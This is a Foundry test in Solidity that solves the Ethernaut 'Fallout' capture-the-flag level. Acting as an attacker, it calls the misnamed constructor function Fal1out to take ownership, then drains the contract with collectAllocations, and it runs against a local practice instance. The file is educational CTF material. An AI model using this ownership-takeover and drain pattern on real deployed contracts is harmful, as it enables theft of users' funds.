// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/levels/02-Fallout/FalloutFactory.sol";
import "../src/core/Ethernaut.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Sets an address' balance, (who, newBalance)
        vm.deal(attacker, 1 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutContract = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        falloutContract.Fal1out{value: 1 wei}();
        assertEq(falloutContract.owner(), attacker);

        falloutContract.collectAllocations();
        assertEq(address(falloutContract).balance, 0);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
